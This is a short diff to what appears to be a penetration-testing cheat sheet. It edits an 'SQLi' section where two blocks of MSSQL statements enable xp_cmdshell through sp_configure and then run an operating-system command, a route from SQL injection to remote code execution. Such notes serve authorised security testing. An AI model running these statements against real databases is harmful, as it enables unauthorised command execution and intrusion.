@@ -114,12 +114,26 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 
 ### SQLi
 
-- To RCE:
-   ```sql
-   EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-   xp_cmdshell 'COMMAND';
-   ```
+**RCE**
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+xp_cmdshell 'COMMAND';
+```
+
+```
+EXEC sp_configure 'allow updates', 0
+RECONFIGURE
+EXEC sp_configure 'show advanced options', 1
+go
+RECONFIGURE
+GO
+EXEC sp_configure 'xp_cmdshell', 1
+GO
+RECONFIGURE
+GO
+xp_cmdshell 'COMMAND';
+```
 
 ### Linux
 
